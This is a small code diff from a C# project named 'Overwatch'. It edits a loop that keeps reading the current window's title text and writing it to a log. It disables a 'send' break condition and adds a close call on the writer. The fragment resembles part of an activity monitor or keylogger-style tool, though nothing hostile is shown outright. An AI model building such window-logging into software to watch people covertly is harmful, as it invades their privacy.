@@ -37,9 +37,8 @@ namespace Overwatch
                     string tempWindowText, lastWindowText = "";
                     while (true)
                     {
-                        if (send)
-                            break;
-                        
+                        //if (send)
+                          //  break;
                         for (Int32 i = 0; i < 1000; i++)
                         {
                             tempWindowText = getCurrentWindowText();
@@ -92,6 +91,7 @@ namespace Overwatch
                         writer.Flush();
                         System.Threading.Thread.Sleep(25);
                     }
+                    writer.Close();
                 }
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
